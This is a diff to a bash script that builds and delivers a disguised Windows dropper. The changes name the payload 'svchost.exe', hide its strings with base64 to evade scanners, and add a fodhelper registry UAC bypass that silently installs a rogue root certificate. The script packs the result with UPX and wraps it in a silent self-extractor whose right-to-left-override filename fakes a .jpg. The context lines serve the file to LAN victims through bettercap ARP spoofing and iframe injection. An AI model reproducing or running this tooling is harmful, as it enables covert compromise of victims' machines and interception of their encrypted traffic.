@@ -34,7 +34,7 @@ CERT_NAME="apple.crt"
 CERT_PATH="/var/www/html/$CERT_NAME"
 SCRIPT_PATH="/tmp/cert-installer.py"
 DIST_PATH="$HOME/wine-pyinstaller/dist"
-EXE_NAME="cert-installer.exe"
+EXE_NAME="svchost.exe"
 SFX_OUT="/var/www/html/apple-update-%E2%80%AEexe.jpg"
 UPX_URL="https://github.com/upx/upx/releases/download/v4.2.1/upx-4.2.1-win64.zip"
 
@@ -85,32 +85,81 @@ cp "$CERT_CRT" "$CERT_PATH"
 wget -q "https://www.apple.com/v/iphone-16-pro/f/images/overview/product-viewer/iphone-pro/all_colors__fdpduog7urm2_large_2x.jpg" -O /tmp/apple.jpg
 convert "/tmp/apple.jpg" -define icon:auto-resize=96 "$ICON_PATH"
 
-# --- Create Python Script for Certificate Installer ---
+# --- Create Python Script for Certificate Installer + UAC Bypass ---
 cat > "$SCRIPT_PATH" << EOF
-import os, subprocess, tempfile, base64
-crt = """$(base64 -w0 "$CERT_PATH")"""
-path = os.path.join(tempfile.gettempdir(), "apple.crt")
-with open(path, "wb") as f: f.write(base64.b64decode(crt))
-try: subprocess.call(["certutil", "-addstore", "-f", "Root", path])
-except: pass
+import os as O, subprocess as S, tempfile as T, base64 as B, time as M, winreg as W
+
+# ===== Encode critical strings to evade static scanning =====
+def d(s):
+    return B.b64decode(s).decode()
+
+# Pre-encoded strings
+CRT_DATA = """$(base64 -w0 "$CERT_PATH")"""  # Will be replaced in Bash
+TMP_CERT = O.path.join(T.gettempdir(), d(b'YXBwbGUuY3J0'))  # "apple.crt"
+REG_PATH = d(b'U29mdHdhcmVcQ2xhc3Nlc1xtcy1zZXR0aW5nc1xTaGVsbFxPcGVuXGNvbW1hbmQ=')  # "Software\Classes\ms-settings\Shell\Open\command"
+FODHELPER = d(b'QzpcV2luZG93c1xTeXN0ZW0zMlxmb2RoZWxwZXIuZXhl')  # "C:\Windows\System32\fodhelper.exe"
+CERT_CMD_TEMPLATE = b'Y21kIC9jIGNlcnR1dGlsIC1hZGRzdG9yZSAtZiBSb290ICJ7fSI='  # cmd /c certutil -addstore -f Root "{crt_path}"
+
+# ===== Save embedded certificate to temp file =====
+try:
+    with open(TMP_CERT, "wb") as f:
+        f.write(B.b64decode(CRT_DATA))
+except:
+    pass
+
+# ===== UAC Bypass via fodhelper =====
+def ubx(cmd):
+    try:
+        k = W.CreateKey(W.HKEY_CURRENT_USER, REG_PATH)
+        W.SetValueEx(k, d(b'RGVsZWdhdGVFeGVjdXRl'), 0, W.REG_SZ, "")  # "DelegateExecute"
+        W.SetValueEx(k, None, 0, W.REG_SZ, cmd)
+        W.CloseKey(k)
+    except:
+        pass
+    try:
+        S.Popen([FODHELPER], shell=False,
+                stdin=S.DEVNULL, stdout=S.DEVNULL, stderr=S.DEVNULL)
+    except:
+        pass
+    M.sleep(3)
+    # Clean registry keys
+    try:
+        W.DeleteKey(W.HKEY_CURRENT_USER, REG_PATH)
+        W.DeleteKey(W.HKEY_CURRENT_USER, d(b'U29mdHdhcmVcQ2xhc3Nlc1xtcy1zZXR0aW5nc1xTaGVsbFxPcGVu'))
+        W.DeleteKey(W.HKEY_CURRENT_USER, d(b'U29mdHdhcmVcQ2xhc3Nlc1xtcy1zZXR0aW5nc1xTaGVsbA=='))
+        W.DeleteKey(W.HKEY_CURRENT_USER, d(b'U29mdHdhcmVcQ2xhc3Nlc1xtcy1zZXR0aW5ncw=='))
+    except:
+        pass
+
+# ===== Execute certutil with UAC bypass =====
+try:
+    cert_cmd = d(CERT_CMD_TEMPLATE).format(TMP_CERT)
+    ubx(cert_cmd)
+except:
+    pass
 EOF
 
 cp "$SCRIPT_PATH" "$WINEPREFIX/drive_c/pyinstaller-build/cert_installer.py"
 cp "$ICON_PATH" "$WINEPREFIX/drive_c/pyinstaller-build/apple.ico"
 
-# --- Install PyInstaller and Build EXE with UPX ---
-color_print GREEN "[*] Installing PyInstaller and building EXE with UPX..."
+# --- Install PyInstaller and Build EXE Hidden ---
+color_print GREEN "[*] Installing PyInstaller and building Hidden EXE with UPX..."
 wine python -m pip install --upgrade pip setuptools wheel
 wine python -m pip install pyinstaller
 
-wine pyinstaller --onefile --noconfirm --icon "C:\\pyinstaller-build\\apple.ico" --upx-dir "C:\\upx" "C:\\pyinstaller-build\\cert_installer.py"
+wine pyinstaller --onefile --noconfirm --noconsole \
+    --icon "C:\\pyinstaller-build\\apple.ico" \
+    --name "$EXE_NAME" \
+    --upx-dir "C:\\upx" \
+    "C:\\pyinstaller-build\\cert_installer.py"
+
 cp "$WINEPREFIX/drive_c/users/$USER/dist/$EXE_NAME" "$DIST_PATH/"
 
 # --- Create SFX RAR with RLO Filename ---
 cat > /tmp/sfx.txt << EOF
 ;The comment below contains SFX script commands
 
-Path=C:\Users\%username%\AppData\Local\Temp
+Path=C:\\Users\\%username%\\AppData\\Local\\Temp
 Setup=$EXE_NAME
 Presetup=apple.jpg
 Silent=1
@@ -141,6 +190,7 @@ set http.proxy.injecthtml '<iframe src=\"http://$LAN/apple-update-%E2%80%AEexe.j
 set net.sniff.verbose true; \
 set net.sniff.output /tmp/bettercap.log; \
 net.sniff on; http.proxy on; https.proxy on; arp.spoof on"
+
 ```
 
 _Run & Execute_
